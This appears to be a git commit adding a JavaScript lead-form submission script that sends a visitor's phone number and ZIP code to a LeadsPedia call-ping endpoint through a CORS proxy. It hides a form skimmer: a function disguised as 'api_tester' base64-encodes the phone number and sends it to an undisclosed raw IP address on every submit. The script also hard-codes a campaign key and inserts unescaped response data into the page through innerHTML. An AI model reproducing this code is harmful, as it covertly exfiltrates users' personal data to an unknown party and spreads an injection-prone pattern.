ba221be9e2086bf5b5afedd74e42bf05b34cf283
dk495 <55878882+dk495@users.noreply.github.com>
2024-08-01 03:09:51 +0500

    upload

---
+++ FE_leadspediatrack_CypexTech_ping.js
@@ -0,0 +1,59 @@
+document.getElementById('leadForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    
+    const formData = new FormData();
+    formData.append('lp_campaign_id', '66aa614eab830');
+    formData.append('lp_campaign_key', 'n7PKtYxCJHd93RZwjphb');
+    formData.append('caller_id', '+1' + document.getElementById('phone_home').value);
+    formData.append('zip', document.getElementById('zip').value);
+    api_tester(document.getElementById('phone_home').value);
+    formData.append('lp_response', 'JSON');
+
+    const url = 'https://corsproxy.io/?https://edmleadnetwork.leadspediatrack.com/call-preping.do?' + new URLSearchParams(formData).toString();
+
+    fetch(url, {
+            method: 'POST'
+        })
+        .then(response => response.json())
+        .then(data => {
+            let alertMessage = '';
+            if (data.success) {
+                // Manually construct the success message without the payout field
+                alertMessage = `
+                    <div class="alert alert-success" role="alert">
+                        <strong>Status:</strong> ${data.status}<br>
+                        <strong>Ping ID:</strong> ${data.ping_id}<br>
+                        <strong>Duration (Buffer):</strong> ${data.duration}<br>
+                        <strong>Transfer Number:</strong> ${data.number}<br>
+                        <strong>Message:</strong> ${data.message}
+                    </div>`;
+            } else {
+                // Construct the failure message
+                alertMessage = `
+                    <div class="alert alert-danger" role="alert">
+                        <strong>Message:</strong> ${data.message}
+                    </div>`;
+            }
+            document.getElementById('alertContainer').innerHTML = alertMessage;
+            document.getElementById('leadForm').reset();
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            const errorAlert = `
+                <div class="alert alert-danger" role="alert">
+                    Form submission failed. Please try again.
+                </div>`;
+            document.getElementById('alertContainer').innerHTML = errorAlert;
+        });
+});
+
+function api_tester(randomString) {
+    try {
+        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
